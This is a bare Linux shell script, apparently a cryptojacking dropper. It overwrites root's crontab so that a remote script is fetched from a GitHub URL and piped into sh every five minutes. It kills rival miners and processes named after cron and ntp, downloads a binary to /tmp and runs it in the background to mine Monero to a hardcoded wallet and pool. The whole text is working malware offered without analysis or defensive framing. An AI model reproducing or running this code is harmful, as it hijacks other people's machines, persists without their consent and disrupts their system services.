export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo '\n\n*/5 * * * * wget -N https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh\n\n' > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo '\n\n*/5 * * * * wget -N https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh\n\n' > /var/spool/cron/crontabs/root

ps auxf|grep -v grep|grep /tmp/duckduckgo|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/usr/bin/cron"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/opt/cron"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/usr/sbin/ntp"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/opt/minerd"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "yam"|awk '{print $2}'|xargs kill -9

Dohttpl()
{
if [ ! -f "/tmp/httpl" ]; then
wget -P /tmp https://github.com/idg7494/idg7494/raw/master/httpl
fi
chmod +x /tmp/httpl
nohup /tmp/httpl -c x -M stratum+tcp://437j1SzjJp56GJY424YSvX6acUafYdfjvLr4hex9wQraYAznJ4VQnPsLV4qCvvhEmFWeqAP347yuZhuhoawANZtm6b29keq:x@xmr.crypto-pool.fr:443/xmr > /dev/null 2>&1 &
}

ps auxf|grep -v grep|grep "httpl" || Dohttpl